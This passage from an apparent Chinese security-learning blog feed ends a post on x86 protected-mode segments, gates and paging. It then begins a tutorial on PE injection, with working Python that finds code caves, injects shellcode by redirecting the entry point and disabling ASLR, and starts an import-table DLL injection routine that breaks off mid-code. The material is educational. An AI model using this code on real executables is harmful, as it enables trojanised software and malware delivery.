alt="2-6"><br>陷阱门也位于IDT中，和中断门的结构完全一致，只有Type位不同，二者的区别是陷阱门不会关中断；<br><img src="/images/2-10.png" alt="2-10"></p><h3 id="2-4-任务门"><a href="#2-4-任务门" class="headerlink" title="2.4 任务门"></a>2.4 任务门</h3><p><img src="/images/2-7.png" alt="2-7"><br>任务门结构与陷阱门类似，但是少了Offset字段，因为TSS段都是固定结构。任务门的作用是将新的段选择子和其他不可见部分加载到TR寄存器中；</p><h2 id="3-页"><a href="#3-页" class="headerlink" title="3 页"></a>3 页</h2><p>程序运行后会有独立的4GB的虚拟内存，其中的地址被称为线性地址，而在真正读取内存时会转化成真实的物理地址。而如何由线性地址定位到物理地址就使用到了分页。<br>每一个进程都包含了一个CR3寄存器的值，里面存放的是一个指向一个4KB大小的物理页的物理地址。</p><h3 id="3-1-普通分页"><a href="#3-1-普通分页" class="headerlink" title="3.1 普通分页"></a>3.1 普通分页</h3><p><img src="/images/2-14.png" alt="2-14"><br>10-10-12分页，三级页表寻址：</p><ol><li>1KB的PDT，包含1024个PDE，可以寻址1024个PTD；</li><li>1KB的PTT，包含1024个PTE，可以寻址1024个页；</li><li>4KB的页，所以总共可以寻址1KB * 1KB * 4KB &#x3D; 4GB大小的物理内存空间；<br>PDE与PTE的结构：<br><img src="/images/2-15.png" alt="2-15"></li></ol><hr><p>线性地址按照10-10-12的结构将32位分成3组，依次表示：</p><ol><li>PDT中的偏移（需要×4）；</li><li>PTT中的偏移（需要×4）；</li><li>页中的偏移；<br>每个进程的PDT基址不同，存储在进程中的CR3寄存器的值中（不是真的寄存器），然后使用此基址和PDT偏移定位到PTT，再定位到具体的页和地址即可完成地址的转换。</li></ol><h4 id="实验5：线性地址转物理地址"><a href="#实验5：线性地址转物理地址" class="headerlink" title="实验5：线性地址转物理地址"></a>实验5：线性地址转物理地址</h4><p>首先使用CE获取到线性地址：<br><img src="/images/2-16.png" alt="2-16"><br>然后在WinDBG中查看进程对应的CR3：<br><img src="/images/2-17.png" alt="2-17"><br>通过计算线性地址得到的偏移得到物理地址：<br><img src="/images/2-18.png" alt="2-19"></p><hr><p>CPU可以通过CR3的值定位到PDT和PTT，但是操作系统只能访问线性地址，那么如何通过线性地址去访问到PDT和PTT来设置进程的PDE和PTE呢？可以使用两个特殊的线性地址：页目录表基址（0xC0300000）和页表基址（0xC0000000）；</p><h4 id="实验6：PDT基址和PTT基址"><a href="#实验6：PDT基址和PTT基址" class="headerlink" title="实验6：PDT基址和PTT基址"></a>实验6：PDT基址和PTT基址</h4><p>线性地址0xC0300000的寻址过程如下图，可见最后的物理地址转换成了CR3的值，也就是PDT的基址：<br><img src="/images/2-19.png" alt="2-19"><br>线性地址0xC0000000的寻址过程如下图，可见最后的物理地址转换成了一个当前PTT（第一个PTT）的基址：<br><img src="/images/2-20.png" alt="2-23"><br>最后得到访问PDE的公式：<br>0xC0300000 + PDI * 4；<br>访问PTE的公式：<br>0xC0000000 + PDI * 4096 + PTI * 4</p><h3 id="3-2-PAE分页"><a href="#3-2-PAE分页" class="headerlink" title="3.2 PAE分页"></a>3.2 PAE分页</h3><p>PAE分页又称为2-9-9-12分页，之所以采取这种新的分页方式是因为普通的10-10-12分页最多只支持4GB物理内存的寻址，而PAE分页通过扩充PTE的长度，可以支持最多64GB物理内存的寻址。但是不同的分页方式不会影响线性地址的寻址，每个进程依旧是4GB的虚拟地址。<br>PAE分页的寻址方式是：</p><ol><li>页的大小不变，依然是4KB；</li><li>PTE由4BYTE扩展到8BYTE；</li><li>PTT依然是4KB，那么每个PTT只能容纳512个PTE；</li><li>PTT的总数由1024减少到512，PDE的长度扩充到8BYTE；</li><li>新增一级寻址表PDPTT，只有4个表项，使得PDT的个数从1个增加到4个；<br>可以看到，在保持4GB虚拟空间的条件下，对物理内存映射并没有占满（因为8BYTE的PTE有24bits是用来寻址的，那么总共有32KB的PTT，但是每个进程只能占有2KB的PTT）；<br>各表项结构如下：<br><img src="/images/2-21.png" alt="2-21"></li></ol><h4 id="实验7：PAE寻址"><a href="#实验7：PAE寻址" class="headerlink" title="实验7：PAE寻址"></a>实验7：PAE寻址</h4><p>和实验5类似，不过增加了一个PDPTT表：<br><img src="/images/2-22.png" alt="2-22"><br><img src="/images/2-23.png" alt="2-23"><br><img src="/images/2-24.png" alt="2-24"></p><h2 id="4-其他"><a href="#4-其他" class="headerlink" title="4 其他"></a>4 其他</h2><h3 id="4-1-TLB"><a href="#4-1-TLB" class="headerlink" title="4.1 TLB"></a>4.1 TLB</h3><p>快表（TLB）位于CPU内部，提供从相对地址到物理地址的映射关系，结构如下：<br><img src="/images/2-25.png" alt="2-25"></p><ul><li>ATTR由各个表中的表项决定；</li><li>LRU用来实现TLB表项的更新算法；<br>快表和CR3寄存器的值挂钩，CR3寄存器一旦发生变化，快表也会随之更改。<br>可以使用<em><strong>INVLPG</strong></em>指令使得TLB当前缓存无效来刷新TLB。</li></ul><h3 id="4-2-cache"><a href="#4-2-cache" class="headerlink" title="4.2 cache"></a>4.2 cache</h3><p>缓存同样位于CPU内部，其提供的是物理地址到数据之间的映射；<br>在PTE等表项中有两个字段和cache相关：</p><ul><li>PWT：1时写入缓存的同时也要写入内存；</li><li>PCD：1时禁止缓存页面；</li></ul><h3 id="4-3-中断-异常"><a href="#4-3-中断-异常" class="headerlink" title="4.3 中断&amp;异常"></a>4.3 中断&amp;异常</h3><ul><li>可屏蔽中断（INTR）：会受到 IF 寄存器影响，具有16个不同的IRQ编号，时钟中断为IRQ0，位于IDT中的0x30，其他中断号IRQ1-IRQ15位于0x31-0x3f；</li><li>不可屏蔽中断（NMI）：不受 IF 影响，固定位于IDT的0x2；</li><li>异常又称为软件中断，是由CPU自己产生的，不受 IF 影响；</li></ul><h3 id="4-4-控制寄存器"><a href="#4-4-控制寄存器" class="headerlink" title="4.4 控制寄存器"></a>4.4 控制寄存器</h3><p>CR0——系统的控制标志：<br><img src="/images/2-26.png" alt="2-26"></p><ul><li>PE：1时表示保护模式，0时表示实模式；</li><li>PG：1时表示开启分页；</li><li>WP：写保护，1时表示只读；<br>CR1——保留；<br>CR2——引起缺页异常的线性地址：<br><img src="/images/2-28.png" alt="2-28"><br>CR3——页目录基地址和缓存控制标志：<br><img src="/images/2-27.png" alt="2-27"><br>CR4——系统的扩展标志：<br><img src="/images/2-29.png" alt="2-29"></li><li>VME：虚拟8086模式；</li><li>PAE：1时启用PAE分页；</li><li>PSE：1时开启大页（2MB）；</li></ul><h2 id="5-写在最后"><a href="#5-写在最后" class="headerlink" title="5 写在最后"></a>5 写在最后</h2><p>本文主要讲述了x86保护模式下的三大基础部分：段，门和页。</p><p>在保护模式下，段寄存器并不用来寻址，而是用来表明当前段的属性，并且我们看到的16位只是可见部分的选择子，通过选择子定位到GDT表中的特定一项来获取到关于此段的完整信息并将其中一些信息保存到段寄存器的其他80位不可见部分。在Windows系统下，大部分的段都是4GB大小的平坦段，操作系统使用页而不是段来做内存保护，段的主要作用是权限控制。在3环进0环后甚至不需要切换DS寄存器。</p><p>门是Windows下提权的主要方式，除了调用门之外的其他门都位于IDT中。调用门通过CALL指令调用，如果切换到具有0环权限的选择子的CS时就可以完成权限提升。中断门和陷阱门类似，都是通过INT进行调用，唯一区别是陷阱门调用后不会关中断。中断门（陷阱门）调用后也会为CS提供新的选择子，此时就可以完成提权。</p><p>任务段TSS比较特殊，其是固定大小的一段栈，本意是用来快速保存所有寄存器的值，Windows使用TSS用于在权限切换时获取到0环的SS和ESP。</p><p>Window使用分页机制实现内存的读写保护。每一个4KB大小的页都有对应的页描述符（PED, PTE）标识页的属性。10-10-12分页实现了4GB线性地址到物理地址的一一映射，但是其最高只能寻址到4GB物理空间。2-9-9-12分页依旧是4GB线性地址映射到4GB物理地址，但是其最高寻址的物理地址范围增加到64GB。</p><p>第一次接触到内核这么底层深入的东西，一切都很陌生，虽然已经学过了汇编和操作系统，但是感觉对保护模式的运行理解起来还是比较吃力。首先在搭建环境上就栽了跟头，可能是因为VMWare设置的全局串口重复，导致使用Windbg连接后很容易就卡死，然后我只能把虚拟机VMX的进程杀了，但是这样做似乎会损坏系统，导致我再次连接时出现问题，重装了3次XP才终于弄清楚问题所在。。。</p><p>保护模式的入门学习就先到这里了，感觉学到的东西都只是简单的理解了原理，真正实践起来还是不熟练。感谢各位大佬的教程中的耐心讲解，下一篇应该是驱动和系统调用的学习，加油。</p><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6 参考"></a>6 参考</h2><ul><li>羽夏的博客： <a href="https://www.cnblogs.com/wingsummer/p/15308064.html">https://www.cnblogs.com/wingsummer/p/15308064.html</a></li><li>lzyddf的博客 <a href="https://blog.csdn.net/qq_41988448/article/details/102563325">https://blog.csdn.net/qq_41988448/article/details/102563325</a></li><li>周壑的视频教程： <a href="https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296">https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-段&quot;&gt;&lt;a href=&quot;#1-段&quot; class=&quot;headerlink&quot; title=&quot;1 段&quot;&gt;&lt;/a&gt;1 段&lt;/h2&gt;&lt;h3 id=&quot;1-1-段选择子&quot;&gt;&lt;a href=&quot;#1-1-段选择子&quot; class=&quot;headerlink&quot; title=&quot;1.1 段</summary>
      
    
    
    
    <category term="Windows" scheme="http://reop.cc/categories/Windows/"/>
    
    
  </entry>
  
  <entry>
    <title>注入、劫持和Hook——Windows安全入门（一）</title>
    <link href="http://reop.cc/Windows/775dd0960ce1.html"/>
    <id>http://reop.cc/Windows/775dd0960ce1.html</id>
    <published>2024-03-01T16:00:00.000Z</published>
    <updated>2024-03-10T13:05:40.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-PE注入"><a href="#1-PE注入" class="headerlink" title="1 PE注入"></a>1 PE注入</h2><p>PE注入就是对静态的PE文件进行修改，使其在运行时能够加载我们需要的构造的代码。因为都是对文件进行静态的修改，只需要处理好RVA和Offset之间的转换，保证PE完整的结构就好，相对来说比较简单。<br>此部分代码都使用Python实现，使用pefile模块对PE文件进行操作，十分方便。当然因为PE的结构就是通过头文件定义的，使用C语言也很方便。</p><h3 id="1-1-寻找空洞"><a href="#1-1-寻找空洞" class="headerlink" title="1.1 寻找空洞"></a>1.1 寻找空洞</h3><p>寻找代码中的空闲区域的大小，作为PE注入前的参考。<br>参考了<em><strong>cave miner</strong></em>项目，但是我没有研究其源码，只是按照其原理通过比较节表中的 SizeOfRawData 和 Misc_VirtualSize 属性，实现了最简单的功能。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pefile <span class="token keyword">import</span> PE  <span class="token keyword">import</span> sys      <span class="token keyword">def</span> <span class="token function">search_cave</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> minsize<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""      搜索代码空洞      """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>      caves <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] FileAlign:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment<span class="token punctuation">&#125;</span></span><span class="token string">Bytes"</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] SectAlign:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">&#125;</span></span><span class="token string">Bytes\n"</span></span><span class="token punctuation">)</span>      <span class="token comment"># 1. Cave Before Sections  </span>    sectionDataBegin <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData      sectionTableEnd <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__file_offset__ <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span>      caveSize <span class="token operator">=</span> sectionDataBegin <span class="token operator">-</span> sectionTableEnd <span class="token operator">-</span> <span class="token number">40</span>      RVA <span class="token operator">=</span> sectionTableEnd      flags <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">if</span> caveSize <span class="token operator">></span> minsize<span class="token punctuation">:</span>         caves<span class="token punctuation">.</span>append<span class="token punctuation">(</span>            <span class="token punctuation">[</span><span class="token string">'BEFORE '</span> <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sectionTableEnd <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">,</span> sectionDataBegin<span class="token punctuation">,</span> caveSize<span class="token punctuation">,</span> RVA<span class="token punctuation">,</span>             flags<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment"># 2. Cave In Each Sections  </span>    <span class="token keyword">for</span> section <span class="token keyword">in</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>         caveSize <span class="token operator">=</span> section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">-</span> section<span class="token punctuation">.</span>Misc_VirtualSize         <span class="token keyword">if</span> caveSize <span class="token operator">></span> minsize<span class="token punctuation">:</span>            begin <span class="token operator">=</span> section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> section<span class="token punctuation">.</span>Misc_VirtualSize            RVA <span class="token operator">=</span> section<span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> section<span class="token punctuation">.</span>Misc_VirtualSize            flags <span class="token operator">=</span> <span class="token punctuation">(</span>section<span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> <span class="token number">0xf0000000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">29</span>            <span class="token comment"># print(flags)  </span>          caves<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'IN '</span> <span class="token operator">+</span> section<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> begin<span class="token punctuation">,</span> begin <span class="token operator">+</span> caveSize<span class="token punctuation">,</span> caveSize<span class="token punctuation">,</span> RVA<span class="token punctuation">,</span> flags<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> cave <span class="token keyword">in</span> caves<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] "</span> <span class="token operator">+</span> cave<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">":\n"</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tBegin:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"h\n"</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tEnd:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"h\n"</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tSize:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'h ('</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'Bytes)'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"\n"</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tRVA:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"h\n"</span><span class="token punctuation">)</span>         flags <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'---'</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> cave<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">:</span>            flags<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'w'</span>         <span class="token keyword">if</span> cave<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">:</span>            flags<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'r'</span>         <span class="token keyword">if</span> cave<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>            flags<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'x'</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tFlags:\t"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"\n"</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[Usage] python search.py &lt;filename> [minsize]"</span><span class="token punctuation">)</span>         exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>         search_cave<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>         search_cave<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-注入shellcode"><a href="#1-2-注入shellcode" class="headerlink" title="1.2 注入shellcode"></a>1.2 注入shellcode</h3><p>向空洞中注入shellcode，然后修改OEP指向shellcode的入口。需要注意的是要确保注入点的节具有执行权限。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">inject_shellcode</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""      代码空洞注入shellcode      """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>      rva <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>      data_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>data_size<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>offset <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] The cave is too small!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>      <span class="token comment"># 添加call指令  </span>    opcode <span class="token operator">=</span> <span class="token string">b'\xe8'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span>data_size<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      payload <span class="token operator">+=</span> opcode      <span class="token comment"># 修改OEP  </span>    new_oep <span class="token operator">=</span> rva <span class="token operator">+</span> data_size <span class="token operator">-</span> <span class="token number">5</span>      pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>AddressOfEntryPoint <span class="token operator">=</span> new_oep      <span class="token comment"># 关闭ASLR  </span>    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DllCharacteristics <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xff</span>      <span class="token comment"># 定位节  </span>    inject_section <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>      <span class="token keyword">for</span> section <span class="token keyword">in</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>         <span class="token keyword">if</span> offset <span class="token operator">&lt;=</span> section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> section<span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">:</span>            inject_section <span class="token operator">=</span> section            <span class="token keyword">break</span>      inject_section<span class="token punctuation">.</span>Characteristics <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0xe0000000</span>      <span class="token comment"># 注入shellcode  </span>    pe<span class="token punctuation">.</span>__data__ <span class="token operator">=</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span><span class="token punctuation">:</span>offset<span class="token punctuation">]</span> <span class="token operator">+</span> payload <span class="token operator">+</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>offset <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>      <span class="token comment"># pe.set_data_bytes(offset, shellcode)  </span>    <span class="token comment"># 写入文件  </span>    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_injected.exe'</span><span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Injected PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-注入导入表"><a href="#1-3-注入导入表" class="headerlink" title="1.3 注入导入表"></a>1.3 注入导入表</h3><p>通过注入导入表使PE文件可以加载任意的DLL，但是导入表的后面一般没有足够的空间来添加表项，此时需要将原来的整个导入表复制到足够大的空洞处再新增表项，同时修改可选头中标识的导入表的RVA。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">inject_import</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""      注入导入表      :return:      """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>      <span class="token comment"># 复制旧IDT  </span>    IDT_offset <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_offset_from_rva<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span>      IDT_size <span class="token operator">=</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Size <span class="token operator">-</span> <span class="token number">20</span>      IDT_data <span class="token operator">=</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>IDT_offset<span class="token punctuation">:</span>IDT_offset<span class="token operator">+</span>IDT_size<span class="token punctuation">]</span>      pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> IDT_data<span class="token punctuation">)</span>      <span class="token comment"># 新建一个IDT项  </span>    begin <span class="token operator">=</span> offset <span class="token operator">+</span> IDT_size      new_IDT <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_IMPORT_DESCRIPTOR_format__<span class="token punctuation">)</span>      new_IDT<span class="token punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_IDT<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      new_IDT<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      begin <span class="token operator">+=</span> <span class="token number">40</span>      <span class="token comment"># INT  </span>    new_IDT<span class="token punctuation">.</span>OriginalFirstThunk <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      new_INT <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_THUNK_DATA_format__<span class="token punctuation">)</span>      new_INT<span class="token punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_INT<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      new_INT<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      begin <span class="token operator">+=</span> <span class="token number">8</span>      <span class="token comment"># IAT  </span>    new_IDT<span class="token punctuation">.</span>FirstThunk <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      new_IAT <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_THUNK_DATA_format__<span class="token punctuation">)</span>      new_IAT<span class="token 